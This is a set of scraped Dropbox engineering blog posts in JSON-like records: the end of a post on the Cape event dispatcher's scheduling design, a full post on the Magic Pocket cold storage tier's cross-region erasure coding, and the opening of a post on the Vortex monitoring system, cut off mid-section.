Event source reliability Finally we come back to the initial setup: events must be published by the source in a reliable way. In production this can be very hard to achieve. Often the creation of an event is in the path of a critical Dropbox service (think about syncing a file or signing up as new user). In a large scale distributed system, failure happens almost all the time. When there is a publish failure, the rational choice is to give up so as to avoid impacting the critical service’s availability. The event goes unpublished. Why build a dispatcher? Given the above discussion, using SQS plus a bookkeeping service could provide a possible queuing solution, but we still needed to address scalability and reliability. Because the queue-based system isn’t reliable, and the inefficiency entailed in custom bookkeeping would make scaling a difficult prospect, we chose to build Cape’s scheduling component with a dispatcher. Rather than having event sources send every event with proper ordering to a queue, event sources send pings to a dispatcher. This setup imposes much less workload on event sources as the publish workload for event sources is significantly smaller. Since the Cape has a refresh feature, all pings get tried at least once. Lastly, because all scheduling operations happen inside the dispatcher (avoiding slow communication between servers), we can achieve very low event delivery latency. As a side benefit, having a centralized scheduling component allows Cape to support more advanced processing modes, including scheduling with dependency, ordered processing, and heartbeat. Dispatcher Overview The dispatcher lies at center of Cape’s architecture. It is the system’s brain and controls the full lifecycle of scheduling. Let’s first take a look at dispatcher at the top level. The dispatcher’s data flow is summarized in the following figure. Event sources send lightweight, subject-related pings to the dispatcher. The ping reminds the dispatcher to check and see whether there are any new events to be processed for that subject. Upon receiving the ping, the dispatcher makes a few queries to gather relevant information. This includes querying the cursor from the cursor store, and getting event information from the sources. Using these query results, the dispatcher updates its in-memory state and determines which events need to be processed by which lambdas. At this point jobs—a set of events and a unique job ID—are issued to the corresponding lambda workers. After a worker finishes the processing, it reports back to the dispatcher with a job status. This contains the process results for each event and the same job ID for the corresponding job. Upon receiving job status results, the dispatcher updates the in-memory state. If the job was a success, the dispatcher may advance the corresponding cursor and schedule more jobs if any new scheduling can be triggered. The scheduling lifecycle for a ping ends when the dispatcher’s in-memory state doesn’t have any records for running jobs, and there are no more jobs to be issued. An important feature is the ping refresh component. When pings can’t make it to the dispatcher, Cape’s refresh feature will make sure to resend any lost pings. Dispatcher internal structures Above is a graph of the dispatcher’s internal process. A highlight of the dispatcher design is modularity, one of the key design principles we started with. Each component carries out relatively independent functionality. Instead of sharing memory state, components coordinate with each other by passing messages, though the communication protocol between components is minimal. This design allows each component to be tested separately with great ease. Tracker The tracker is a stateless component that receives pings as input, and produces one or more scheduling requests for the scheduler to consume. It queries the cursor store and event sources for information necessary to making scheduling decisions, and then compiles scheduling requests. Of all the data inside a request, the most important pieces are event interval and event set. The event interval is a closed interval of sequence IDs, and the event set contains all the events within the corresponding interval. Scheduler The scheduler is the only stateful component inside the dispatcher and is the only entity that can write to the cursor store in Cape. Except for reading and writing cursors, the scheduler’s operations are all strictly in memory. Additionally, the scheduler owns the in-memory state that keeps the bookkeeping for jobs. When the scheduler gets a request it creates new jobs and sends them out to the publisher—a stateless component that receives jobs. It sends jobs to an external buffer which is subscribed to by corresponding lambda workers. The RPC server gets the job status from the workers and forwards it to the scheduler. Depending on success or failure, the scheduler may issue more jobs. Because it’s the only component that owns in-memory state, it does all the related bookkeeping. This reflects our observation of scheduling operations. Every scheduling operation consists of expensive but stateless remote queries, plus in-memory logic that requires locking. In our design, stateless procedures are managed by peripheral components and the scheduler focuses on almost pure in-memory scheduling procedures. Components run in parallel and communicate by sending messages. This provides a clear view of how different components work together and the implementation for parallelism is straightforward because the design naturally fits Go’s concurrency model. Deep Dive into two important elements Two key elements that deserve a deeper look are tracker’s procedure for scheduling requests, and the scheduler data structures and algorithm. Tracker operation The tracker takes a ping as input and produces one or more scheduling requests as output. A scheduling request is an object packed with all the information necessary for making scheduling decisions, including: the subject’s latest sequence ID the event interval [sequenceId_start, sequenceId_target] a set of all events within the above interval This tracker procedure is best demonstrated with an example. Let’s say a ping regarding subject S is received, and there are 4 topologies: T1–T4, subscribing to subject S’s events. Upon receiving this ping, the tracker first queries the latest sequence ID for S, which is 100. Then it queries S’s cursor info. Let’s say the content of the cursor info is: T1: 10 T2: 90 T3: 99 T4: 99 Next, the tracker needs to make event queries in order to fetch events for scheduling. An event query takes three arguments: subject, start sequence ID, and max batch size. It returns a sorted list of events beginning with the start sequence ID and which is capped in length by a max batch size. The max batch size is set based on the capability of the event source, as well as on the data size per event from this source. In this example let’s assume the limit is 10. Additionally, it’s important to note that for a given topology, an event range can be used to create new jobs for the topology only when the range contains the topology’s cursor + 1. As you can imagine, event queries can be very expensive, both in terms of latency and the load on the event source. This creates an interesting optimization problem: how do you make the minimum number of event queries, and still allow all topologies to make as much progress as possible? The most naive approach would be to make an event query for each topology. But the problem with this approach is also obvious: it doesn’t scale. As more topologies subscribe to the same event source, the tracker’s workload grows linearly. Because the topologies’ cursors are nearly aligned most of the time, most of the tracker’s queries will be redundant. For our first iteration, we adopted a simple heuristic: make one event query for each distinct cursor value. For instance in the above setting, tracker will make three queries with the following arguments: (S, 11, 10) (S, 91, 10) (S, 100, 10) This had very good performance in the beginning, when most topologies had very simple and robust processing logic. However, as we started adding expensive topologies with jobs that take longer time to execute, or that were sometimes flaky with errors, we observed the system frequently fell into an unstable state where the dispatcher was running hot on CPU and couldn’t keep up with the scheduling. A thorough investigation revealed that the problem was with the event query heuristic. It works well when most topologies have their cursor values aligned. However once a few of them start to experience increased failures, more and more distinct cursor values emerge for a single subject. This causes the tracker’s worker pool to become increasingly busy and then scheduling gets delayed or canceled as the system approaches its capacity limit. This is a vicious cycle. Once the system becomes overwhelmed things only get worse. The system cannot recover on its own. Given that the first heuristic wasn’t robust, an improved heuristic was proposed and applied. In this new approach, cursor values are grouped by vicinity. Only one event query is made for a group. This an improvement because it generates fewer requests than first heuristic when some topologies are degraded. For the given example, we only generate the following event queries: (S, 11, 10) (S, 91, 10) This heuristic has much better tolerance on small cursor misalignment, and is much more robust. When a few topologies are behaving badly, their impact on the dispatcher is well constrained. This heuristic also proved to be highly scalable. We added tens of topologies for a particular event domain, and Cape continues to run efficiently, with very high stability. Scheduler: the only stateful component in Cape’s system Now let’s talk about the scheduler. The scheduler exclusively owns the dispatcher’s in memory data structure for bookkeeping jobs that are currently inflight. For this reason, we call this data structure inflight state. When new information is received from either the tracker or the RPC server, the scheduler updates the inflight state accordingly, and makes correct scheduling decisions. Now we’ll look at inflight state and an illustration of how the scheduling algorithm works. First, a look at the basic scheduling workflow. Inflight state: The inflight state has three components. The first component is a tree structure that allows scheduling information to be stored hierarchically, it’s called state tree. Nodes at the first level of state tree are called subject state. They are the root of the subtree that contains all inflight information for a given subject. Information shared by all inflight jobs for this subject, including cursor info, latest sequence ID, and the ranges of events used by the subject’s inflight jobs are stored by the subject state node. The subject state fans out to the topology state. It’s the root of the subtree that corresponds to this topology’s inflight jobs. Finally, the leaf node is the lambda state, containing a sorted list of the inflight job records. The following graph shows the layout of the state tree. Note how at the root level there is a subject state table that maps inflight subjects to their corresponding subject state nodes. The second component is a timeout list. It’s a priority queue holding references to all inflight jobs, as sorted by their expiration timestamps. A job lookup table, keyed by job ID, is the third component. It maintains the job metadata, which is used to find corresponding job records in the timeout list and the state tree. Scheduling algorithm: To show how the scheduling algorithm works, we need to set up some necessary context. Let’s first assume there are two topologies, T1 and T2. Both subscribe to the same event domain. For simplicity, we’ll assume they both contain a single lambda. The scheduler has received a scheduling request with the following content: subject: S latest sequence ID: 100 event interval: [91, 100] event set: [91, 99, 100] (note that sequence IDs might not be consecutive) Upon receiving this request, the scheduler initiates a scheduling procedure that is carried out by a Go routine. The scheduling procedure finds all the relevant lambda states in the state tree and tries to generate new jobs inside those state nodes. The procedure begins from the subject state. At root there is a table that maps subjects to a corresponding subject state. However, before making any attempts to access a subject state, a lock for that particular subject must be held. This guarantees that no race condition can occur under the subject subtree. With a subject lock, the procedure checks to see if a subject state exists in the root table. If it doesn’t, we need to create the state. During the subject state initialization, the cursor info is fetched from the cursor store. Note that even though the tracker has queried the cursor to generate the request, the scheduler still has to query the cursor in order to initialize a subject state. This is because the tracker and the scheduler operations are independent. Cursor info obtained by the tracker may be stale if the scheduler updates the cursor while the tracker is preparing the request. Let’s assume the cursor info values obtained by the scheduler are as follows: T1: 90 T2: 99 Inside the subject state, content is updated with new information from the request, including the latest sequence ID, and events. Next the procedure examines the topologies in a sorted topological order, determined by their ordering dependency. For each topology we compare the updated event range, which is [91, 100], with each topology’s cursor. Then we start topology-level scheduling with events after their cursors. In this example, T1 is receives events {91, 99, 100}, and T2 receives {100}. At the topology level, the scheduling procedure selects lambdas for scheduling based on lambda dependency. Here the topology’s only lambda is selected. Next, the procedure determines which events should be included in the new jobs. For the T1 lambda, an inflight job with events {91} already exists. A new job will be created with only {99, 100}. For the T2 lambda, assuming there is no existing inflight job, a new job of {100} is created. Once jobs are created, their records are appended to their lambdas’ job lists. The corresponding job records, containing job ID and job expiration time, are inserted into the timeout list. Finally, another set of records that contain job metadata are registered to the job lookup table. Once registration is complete, the jobs are issued to the publisher. After a worker finishes processing the job, a job status update is sent to the scheduler. This triggers a job status update procedure, again carried out by a Go routine. Let’s say the job status update shows that T2’s job has succeeded. The procedure first finds metadata in the lookup table. Once the metadata is obtained, we deregister the record from the lookup table, and use the metadata to remove the corresponding record from the timeout list. Finally we track down the lambda state containing this job, and mark it as success. As there are no pending inflight jobs before this one, T2’s cursor should be updated to 100. Besides handling scheduling request and job status update procedures, the scheduler also periodically purges expired inflight jobs. For each expired job, a timeout procedure is issued to a Go routine. This is essentially the same as a job status update, except it only marks the job as failure. Let’s presume T1’s new job, which contains event {99, 100}, has expired. In the lambda state the corresponding job is marked as failure and is then removed from the inflight state. The cursor won’t be updated if the job failed, ensuring that Cape will retry later. This is certainly an oversimplified description of the scheduler workflow. Real scheduler operations are much more sophisticated than this. The state tree allows us to organize relevant information in a hierarchical structure. Each scheduling procedure—be it handling a scheduling request, job status update, or job timeout—always starts from the top, passes control one level at a time until the leaf node, updating the relevant state at each level. Once the lambda-level operation is done, control is passed back to upper level with proper post-processing. This hierarchical approach allows us to effectively modularize scheduling logic, and thus keep the complexity to a controllable level. Wrap up We hope the this discussion of Cape’s design philosophy and inner workings present a picture of the issues we face when working with large scale distributed systems. We hope this will be useful when readers make their own design decisions. It takes a team of great engineers to build such an advanced and capable distributed system. Many thanks to everyone who contributed to this project: Anthony Sandrin, Arun Krishnan, Bashar Al-Rawi, Daisy Zhou, Iulia Tamas, Jacob Reiff, Koundinya Muppalla, Rajiv Desai, Ryan Armstrong, Sarah Tappon, Shashank Senapaty, Steven Rodrigues, Thomissa Comellas, Xiaonan Zhang, and Yuhuan Du. // Tags Infrastructure Topology Event Processing Dispatcher // Copy link Link copied Link copied", "date": "2018-12-21"},
{"website": "Dropbox", "title": "How we optimized Magic Pocket for cold storage", "author": ["Preslav Le"], "link": "https://dropbox.tech/infrastructure/how-we-optimized-magic-pocket-for-cold-storage", "abstract": "Facebook’s Warm BLOB Storage System New Replication model Conclusion Ever since we launched Magic Pocket, our in-house multi-exabyte storage system , we’ve been continuously looking for opportunities to improve efficiency, while maintaining our high standards for reliability. Last year, we pushed the limits of storage density by being the first major tech company to adopt SMR storage . In this post, we’ll discuss another advance in storage technology at Dropbox: a new cold storage tier that’s optimized for less frequently accessed data. This storage runs on the same SMR disks as our more active data, and through the same internal network. The Lifetime of a file The access characteristics of a file at Dropbox varies heavily over time. Files are accessed very frequently within the first few hours of being uploaded but significantly less frequently afterwards. Here is the cumulative distribution function of file accesses for files uploaded in the last year. Over 40% of all file retrievals in Dropbox are for data uploaded in the last day, over 70% for data uploaded in the last month, and over 90% for data uploaded in the last year. This pattern is unsurprising. A new upload triggers a number of internal systems that fetch the file in order to augment the user experience, such as perform OCR, parse content to extract search tokens, or generate web previews for Office documents. Users also tend to share new documents, so a file is also likely to be synced to other devices soon after upload. In general, people are much more likely to access files they have recently uploaded rather than files they uploaded years ago. We refer to data that’s accessed frequently as “warm” and infrequently accessed data as “cold.” The differences in access characteristics between warm and cold data open up opportunities for cost optimization by tailoring the system to each class of data. Magic Pocket Magic Pocket is our system for storing files. Dropbox splits files into chunks, called blocks, up to 4MB in size. The blocks are immutable—all metadata operations and related complexities around mutations and revision history are handled by the metadata layers on top. Magic Pocket’s job is to durably store and serve those large blocks. This system is already designed for a fairly cold workload. It uses spinning disks, which have the advantage of being cheap, durable, and relatively high-bandwidth. We save the solid-state drives (SSDs) for our databases and caches. Magic Pocket also uses different data encodings as files age. When we first upload a file to Magic Pocket we use n-way replication across a relatively large number of storage nodes, but then later encode older data in a more efficient erasure coded format in the background. Within a given geographic region Magic Pocket is already a highly efficient storage system. Replicating data across geographical regions makes Magic Pocket resilient to large scale natural disasters but also significantly less efficient in aggregate. Cross-region Replication To understand our cold storage developments we first need a high level understanding of how Magic Pocket works . Magic Pocket stores blocks in a highly reliable manner within a storage region but it also stores this data independently in at least two separate regions. Within a region things can get quite complicated, but the interface between regions is quite simple. It’s basically a glorified version of Put, Get, and Delete. Many companies only replicate data across multiple data centers located within tens or a few hundred miles from each other. At Dropbox we set the bar for durability and availability during region outage much higher and replicate data across data centers located thousands of miles apart. We effectively store double the amount of data we would otherwise to better survive large-scale disasters. This overhead has long been an inefficiency that we wanted to rectify. Ever since we built Magic Pocket, we kept asking ourselves, can we maintain the same high bar for safety but in a more efficient way? Requirements In order to better tailor the system for the different workloads, we decided to operate two storage tiers. We built a new cold storage tier, and renamed the original Magic Pocket system the warm tier. We asynchronously migrate data in the background as it becomes cold. Everything that’s not cold is considered warm. The high level requirements for a cold storage system are simple. We can’t sacrifice durability. Period. No matter how rarely any file is used, Dropbox users trust us with their most important stuff. We need to still be able to tolerate a full region outage and multiple rack failures in the surviving regions simultaneously. Availability-wise, we can’t sacrifice read availability but interestingly we don’t actually care about the write availability. Since user-facing writes get written to the warm storage tier we can pause writes into the cold storage tier at any time without affecting users. We can tolerate a slight increase in latency for cold data, since Magic Pocket is already very fast compared to the time it takes to send files over the internet. However, we still need reliably fast access: you probably don’t need your 2007 tax records too often, but when you do, you want them immediately, not in few minutes. Initial Designs We needed to somehow remove the full cross-region replication, but still be able to tolerate geographic outages. If we were to replicate data across regions instead of keeping a full internally-replicated copy in each region, we could reduce storage cost, but this would come with an increased wide-area network cost when we need to reconstruct a file during a region outage. This potential higher network cost is in fact a good tradeoff against lower storage overhead for cold data however, since this data isn’t fetched very frequently. Unfortunately, we did not get this right from the first attempt. We spent a significant amount of time developing solutions that we ended up unhappy with. To better understand our ultimate “good” solution, let’s first look at couple of seemingly-good ideas that didn’t pan out. Single erasure code spanning multiple regions The obvious approach was to remove the strict boundaries between regions, where each one replicates independently, and instead have single software instance that does erasure coding across all regions. The erasure code should have enough internal redundancy to tolerate a large scale regional disaster. We actually went quite far with this approach. We got the prototype of the new system up and running in our stage environment relatively quickly but then started finding more issues and hidden costs. The additional complexity in the design also made all our other storage initiatives more involved and as a result slowed down development. The biggest problem with this approach is that we can’t truly mitigate the durability risk. We promised that the system would not sacrifice durability. In purely-theoretical terms we still provided as many “nines of durability” as the original system, but in practice we could not deliver on that promise. Given that we only had a single large-scale region running a single version of software, a single software bug could wipe out everything no matter how many copies we store. Magic Pocket’s independent region model is extremely resilient to human error—whether it is human writing a software bug or an operator error executing a wrong command. Eliminating the strong logical separation between two storage regions takes away a last line of defense and significantly elevates the possibility of us losing data in the long run. We killed the project after more than nine months of active work. As an engineer, it is not easy to give up something you have been trying to make work for so long. Some of the early conversations were controversial but ultimately everyone agreed killing the project was the right decision for Dropbox and our users. Facebook’s Warm BLOB Storage System Now that we rediscovered the value of independent failure domains by trying to get rid of them, we went back to the drawing board. One very interesting idea, that we previously ruled out in early exploration, was from Facebook’s Warm BLOB storage system . The idea is to pair each volume/stripe/block with a buddy volume/stripe/block in a different geographic region, and then store an XOR of the buddies in a third region. In the above example, block A can be fetched from Region 1. If Region 1 is not available, then block A can be reconstructed from fetching block B and A xor B from Region 2 and Region 3 respectively and performing an XOR. That is a neat idea. We didn’t need to change anything in Magic Pocket region’s internals, and just replicate differently on top of them. We decided to explore this in more detail again… and gave up soon after. Maintaining a globally available data structure with these pairs of blocks came with its own set of challenges. Dropbox has unpredictable delete patterns so we needed some process to reclaim space when one of the blocks gets deleted. All that added up to a lot of complexity that made it less suitable for our use case. New Replication model Not all of the previous work was wasted. Spending so much time on trying to make the previous designs work helped us build a better intuition about tradeoffs on the network stack. We ended up challenging one of our very early implicit assumptions. Do we really need a request for a single block to be able to be fully served from within a single region in the best-case scenario when all regions are up? Given that cold data is infrequently accessed, it’s fine to always incur a higher network cost for accessing it. Removing that constraint of serving from a single region led us to the following design. To illustrate the idea, we are going to use a three region example and XOR for generating a parity block. This method can be generalized and applied to larger set of regions by using something like Reed-Solomon erasure codes to generate parities. Similar to the previous design, we don’t want to change the internal architecture within a region. However, instead of finding and pairing similar sized blocks, we can split a single block into pieces called fragments, and stripe those fragments across multiple regions. To put a block, in our three region example, we split it in two pieces called fragments. We put the first fragment in Region 1, the second fragment in Region 2 and compute the XOR of the fragments to form a third parity fragment and put it in Region 3. Because we are migrating data to the cold tier asynchronously, we can ignore complicated situations where one of the regions isn’t available. If a region is down we can just pause the migration until all three regions are back up. To get a block, we issue a get request to all three regions, wait for the fastest two responses, and cancel the remaining request. We have absolutely no preference over which two fragments we use to perform the reconstruction. Performing an XOR or an erasure decoding is a negligible operation compared to reading data from disk and transferring it over network. To delete a block, we just need to delete all fragments when the block is no longer referenced. Another nice property is that we can do this independently in each region. This allows us to use different versions of the deleter software and run these deletions at different times to prevent a software bug from wiping all fragments by mistake. Latency The most obvious downside of this model is that, even in the best-case, we can’t satisfy a read without fetching fragments from multiple regions. This is not only not as big of a problem as we thought, but also turned out to be a blessing in disguise on many dimensions. Here are latencies we measured at various percentiles as we were rolling out the new storage tier: To begin with, the 5th percentile is significantly higher in the cold tier because we need at least one cross-region network round-trip to retrieve data from the cold tier. Looking at 25th, 50th, 75th and 95th percentile, the difference between the warm and cold tiers stays constant at roughly one network round-trip. Dropbox’s network stack is already heavily optimized for transferring large blocks of data over long distances. We have a highly tuned network stack and gRPC-based RPC framework, called Courier , that is multiplexing requests over HTTP/2 transport. This all results in warm TCP connections with a large window size that allows us to transfer a multi-megabyte block of data with a single round-trip. We were initially very puzzled by the results at the 99th percentile, however. The cold storage tier had lower tail latency than the warm tier! This was confusing initially but after some investigation it started to make sense. The cold tier was getting the fastest 2 out of 3 requests, while the retry logic in the warm tier was more naive—it was first fetching from the closest region and only issuing a request to the other region if the first attempt fails or times-out. There are always some arbitrary slowdowns in a large scale distributed system. Because the warm tier was getting the majority of the traffic we needed to be slightly smarter and can’t simply issue two requests in parallel. Instead we ended up modifying the warm tier to optimistically issue a retry against the second region if the first request attempt does not arrive by given time budget. This allowed us to also bring down high tail latencies in the warm tier, with a small network overhead. You can learn more about this technique from Jeff Dean’s excellent talk at Velocity . One beautiful property of the cold storage tier is that it’s always exercising the worst-case scenario. There is no plan A and plan B. Regardless of whether a region is down or not, retrieving data always requires a reconstruction from multiple fragments. Unlike our previous designs or even the warm tier, a region outage does not result in major shifts in traffic or increase of disk I/O in the surviving regions. This made us less worried about hitting unexpected capacity limits during emergency failover at peak hours. As mentioned in our requirements, we did not have a fixed target for latency, but only directional guidance. Overall, the results we got significantly beat our expectations. Such a small difference would not affect the end user experience, which is dominated by transferring data over the internet. That allowed us to be more aggressive in what data we consider ‘cold’ and eligible for migration. Durability The biggest win in terms of durability is keeping the architecture layered and simple. We can operate each region independently as before and run different versions of software allowing us to detect issues that might slip through testing before it affects all copies of the data. Even rare bugs that take a long time to occur or could slip through our release process are extremely unlikely to affect the same data in two or more regions simultaneously. This is invaluable last line of defense against unknown unknowns. Although it’s hard to quantify in a math equation, in practice it allows us to move faster while being assured of our extremely high level of durability. We’re still vulnerable to bugs in the replication logic that might occur before data is persisted across the independent regions. However, the surface area, amount of data at risk, and number of code paths involved are limited. We can significantly mitigate the risk from bugs by not immediately purging data from the warm tier after cold tier migration. We perform multiple rounds of extensive validations before we purge the data from its original location. Cost savings The warm tier replication model is a 1+1 replication scheme, with one data fragment and one parity fragment, plus replication within these regions, of course. The three region cold tier example is a 2+1 replication scheme, with two data fragments and one parity fragment, plus internal region replication. The total replication factor for the warm tier is 2 * region_internal_replication_factor while the cold tier is 1.5 * region_internal_replication_factor . Thus we can reduce disk usage by 25% by using a three region setup. As mentioned previously, this approach can be generalized for more regions. If we use 4 regions and are willing to tolerate losing any 1 of them, we will have a 3+1 model, which would give us 33% savings. It can also be extended further, to let’s say 4+1 or 5+2, depending on the trade-offs one is willing to make between cost savings and the number of simultaneous region losses tolerated. Conclusion While exploring various solutions to building a cold storage tier, we learned that the set of constraints we define have a huge impact on the way we approach a problem. Sometimes adding a new constraint, such as keeping an independent failure domains at all costs, does narrow down the search space and help us focus by ruling out designs early. However, sometimes removing a constraint, such as serving all reads from within a region at steady state, can open a whole new realm of possibilities. We also learned that although we aim to make data-driven decisions, our intuition is sometimes wrong. We rarely have all data to make a decision and sometimes we don’t even know what data points to look for. The only way to make something work is to try and potentially fail. A bad decision might not be as damaging as long as we’re willing to step back, keep ourselves honest, admit defeat, and course correct when needed. Of course while we learned something about problem-solving, we also ended up with a cold storage system that’s a great fit for our needs. We also got a significant reduction in storage costs without compromising durability or availability, and without introducing any significant complexity in our architecture. Interested in solving challenging open-ended engineering problems in large scale distributed systems? We’re hiring! Acknowledgements Thanks to all current and past members of the Dropbox storage team who’ve contributed to building the cold storage tier: Preslav Le, Alex Taskov, Rebecca Wang, Rajat Goel, Cristian Ferretti, James Cowling, Facundo Agriel, Alexander Sosa, Lisa Kosiachenko, Omar Jaber, and Sandeep Ummadi. // Tags Infrastructure Magic Pocket // Copy link Link copied Link copied", "date": "2019-05-06"},
{"website": "Dropbox", "title": "Monitoring server applications with Vortex", "author": ["Dave Zbarsky"], "link": "https://dropbox.tech/infrastructure/monitoring-server-applications-with-vortex", "abstract": "Metrics before Vortex Design Goals Basic Concepts Design Conclusion At Dropbox, we use monitoring and alerting to gain insight into what our server applications are doing, how they’re performing, and to notify engineers when systems aren’t behaving as expected. Our monitoring systems operate across 1,000 machines, with 60,000 alerts evaluated continuously. In 2018, we reinvented our monitoring and alerting processes, obviating the need for manual recovery and repair. We boosted query speed by up to 10000x in some cases by caching more than 200,000 queries. This work has improved both user experience and trust in the platform, allowing our engineers to monitor, debug, and ship improvements with higher velocity and efficiency. In this blog post, we will: Describe Vortex, our recently-built next-gen monitoring system Convey the scale at which Vortex operates Provide some examples of how we use Vortex Metrics before Vortex We built the original server-side monitoring system in 2013 . And as Dropbox scale expanded by leaps and bounds, maintaining it became untenable. The previous design used Kafka for queueing ingested metrics. Several processes would perform aggregation across tags and over time (downsampling), writing the results back into Kafka. We also had a set of processes consuming data from Kafka and storing it in-memory (for evaluating alerts), in on-disk RocksDB (for data submitted within the last day), and in HBase (for data older than one day). However, scaling to over 600 million metrics per minute processed over the course of more than five years inevitably led to a few issues: Each of these data stores implemented slightly different query capabilities, which led to some queries only working in select contexts Operational issues with Kafka and HBase resulted in frequent manual recovery and repair operations Individual teams were able to deploy code that would emit high-cardinality metrics, which had the potential to take down the ingestion pipeline Operations and deployments of the monitoring infrastructure resulted in ingestion issues and data loss Poor query performance issues and expensive queries weren’t properly isolated, causing outages of the query system. And impatient users would retry queries that weren’t returning, exacerbating the issue. Manual sharding of alerting systems led to outages when alerts were reconfigured Three separate query frontends, one of which pretended to be Graphite (imperfectly), while the others implemented a custom query language. Thus, alerts, graphs, and programmatic access to metrics all had different query languages, which proved to cause substantial difficulty for users. Each frontend also had its own set of limitations and bugs. Our team spent time band-aiding over these may issues, but ultimately it was a losing battle: it was time to reevaluate the architecture. We came up with a set of concrete objectives to steer us in the right direction based on our experiences, with an emphasis on automation and scaling: Design Goals Completely horizontally-scalable ingestion. We wanted the only limit on the ingestion pipeline to be the amount of money we were willing to spend on it. Scaling, we decided, should be as simple as adding nodes to the deployment. Silent deployments. As Dropbox grew to the point of hundreds of independent services deployed to production, it was no longer possible to require a single on-call to keep an eye on things when the monitoring system rolled out an update. We opted to build a system that would eliminate that need entirely. No single points of failure, no manual partitioning. Machine failures happen every day. The system must therefore be able to recover from losing a machine without requiring any action from a human operator. Well-defined ingestion limits. No individual service should be able to disrupt others by accidentally logging too many metrics. Multitenant query system. Individual expensive queries shouldn’t be able to disrupt the monitoring system as a whole. Metrics scale as service scales. Despite ingestion and querying limits, a metrics setup that works for a three-node service should continue to work as the service scales to 300 or even 3,000 nodes. Without this guarantee, developing new services would carry the risk of the metrics breaking down right when you roll out the service to the general population—exactly when you need them the most. Basic Concepts Node In Vortex, a node is a source of metrics. It can be a physical host, a subdivision of a host (container or virtual machine), a network device, etc. Metrics Vortex has support for four types of metrics: counters, gauges, topologies, and histograms. Each metric has a set of tags , some of which are defined by the user of the Vortex libraries while others are defined by the system itself. We will discuss system-defined tags in the section on ingestion. Counter A counter measures the number of occurrences of a certain event over a given time period. For example, Courier (our RPC layer) integrates with Vortex by logging counters of every request, tagged with the RPC service and method names, the result status, and the discovery names of the server and client. Gauge Gauges are used to record a value at the current time. For example, gauges can be used to log the number of actively running workers for your process. Once set, gauges will retain their values until a new value is set, the gauge is explicitly cleared, or the reporting process terminates. Topology A topology metric is a special gauge used to identify the node that’s logging metrics. By special-casing these metrics in the ingestion and querying systems, we are able to join a topology and another metric using the node's ID as the join key. Topologies are thus the special sauce that allow us to scale Vortex in ways that other monitoring systems we evaluated can’t, because a tag on a topology effectively applies to all metrics being emitted by that node, thus decreasing the total cardinality of the node. By tagging onto the topology metric, cardinality decreases. Here are three examples of how topologies are used: Our deployment system integrates with Vortex to emit a topology that includes the service name and Git revision of the running code. Thus, a query for any metric joined on this topology can be broken down by service and revision. Our node exporter—an exporter for hardware and operating system metrics that enables measurement of machine resources such as memory, disk, and CPU use—emits a “node topology” identifying the type of hardware instance the node is running on, the kernel version, etc. This node topology can be used to look for performance and behavior differences in a service deployed across a heterogenous pool of nodes. Our databases emit a topology identifying which database and shard a node is serving. Histogram Histograms are used to record observations and compute summary stats. They provide approximate percentile distributions for the observed values. Design The overall design can be seen in the diagram below; we will dive into each area in more detail. We have labeled communication between processes with the protocol, i.e. Remote Procedure Call (RPC), Stateful streaming (over RPC), and HyperText Transfer Protocol (HTTP). NodeCollector Vortex metrics are stored in a ring buffer in each local process. In Vortex, the primary method of metric collection is poll-based and conducted on two tiers, with buffering on the second tier. The first tier is the NodeCollector. This is a process that runs on every node, responsible for polling the other processes of that node and aggregating the metrics into per-node totals. (We store both per-node and per-process stats, but the default query API only exposes per-node stats). The NodeCollector is in turn polled by a service called MetricCollector, which is responsible for writing the data to storage. NodeCollectors only poll the processes when they are themselves polled, which allows NodeCollector to be stateless, simplifying operations of this global service. MetricCollector Although the MetricCollector polls NodeCollectors every 10 seconds, internally it buffers the metrics for four minutes before flushing to storage. This buffering achieves two main purposes: It lets us remux the data streams—which allows data to enter in one arrangement and leave in another—to be grouped by metric name, rather than by node. When streaming data from the process through NodeCollector and into MetricCollector, it’s important for all data from a single node to be traveling together to ensure that the topology remains accurate. However, at query time it’s more useful to be able to sequentially read data from all nodes for a single metric, without reading unrelated data (other metrics). The buffering also substantially reduces write load on Cassandra, which Dropbox uses for the storage layer. System-defined tags We automatically tag each emitted metric with two additional tags that are universally useful. The first is the ID of the node that emitted this metric. In cases where the node corresponds to a physical hostname, we allow querying either by node_id or by tags derived from the node_id, such as datacenter, cluster, or rack. This sort of breakdown is very useful for troubleshooting problems caused by differences in networking throughput and connectivity, behavior differences across data centers and availability zones, etc. We also tag each metric with a \"namespace,\" which is by default the name of the task that emitted this metric. This is useful when instrumenting core libraries such as Courier RPC, exception reporters, etc., since it allows filtering a specific service to just the core library metrics, without having to propagate extra logging information into all the libraries. High availability The MetricCollector service is actually split into two groups (G0 and G1 in the diagram above), and each NodeCollector establishes communication with a MetricCollector from each group. Each MetricCollector attempts to flush the data to storage if it’s not already there. This setup allows us to tolerate losing individual machines, with no interruption to service or data loss. Limits In order to provide a highly available ingestion pipeline, we’ve instituted limits in several places. Each node has a limited number of per-node and per-process metrics it can export, and metrics are dropped by the NodeCollector to comply with the limits. We have some heuristics in the drop algorithm to prioritize well-behaved users, such as preferential dropping of high-cardinality metric names (to protect Vortex users that deploy their code as part of the still-existing monolith we are moving away from). We also prefer metrics from processes that report fewer metrics over those that report more, to ensure that global services’ metrics aren’t dropped even if some application is misbehaving and exceeding limits. Serving queries The Vortex query subsystem consists of two services: the query cache and the query API. The query cache is partitioned and split into two groups (“G0” and “G1” in the diagram) for high availability, so the frontend exists to encapsulate the routing and make life simple for the clients. Each query cache process consists of a live cache and a range cache. The live cache live-streams the results from the MetricCollectors, reducing query latency for real time alerting, while the range cache stores aggregated rows read from the storage tier. Loading data When the Vortex query service receives a request, the results of the query are typically already cached and up to date, so they can be served in milliseconds. However, sometimes the query has never been issued before or has been evicted from the cache; in these cases, it must be cold-loaded. Due to the ingestion setup and buffering done by MetricCollector, serving a non-cached query requires getting data from three sources: Load all relevant historical data from storage Load the unflushed data from MetricCollector (up to four minutes), as this data hasn’t been written to storage yet Register intent to receive streamed updates for the metrics used in the query with the MetricCollector. Once this is done, MetricCollectors will stream new data as it comes in, and the query system will keep the metric cached and up to date, so future queries will be cache hits. The streaming is necessary because the most common use cases for querying metrics are auto-refreshing dashboards and alerts, both of which request the freshest data every few seconds. Query language While designing Vortex, we decided to implement our own query language, to cleanly represent system concepts such as topology. At a high level, the query language supports grouping by tag values, aggregating away tags, filtering tag values by regex, time shifting, and Unix-like function-chaining. Some example queries and their explanation: Copy courier/client/requests[status]{server=\"vortex_query\"} This query counts the number of Courier RPC requests to the Vortex query service from the client-side point of view, grouping them by status. Copy courier/server/requests[client]{_task=\"vortex_query\", status!=\"success\"} | top 5 This query shows the five clients that are sending the most failing requests to the Vortex query service. Topology joining A join on a topology metric is specified by the @ operator. In a joined query, tags from both the topology 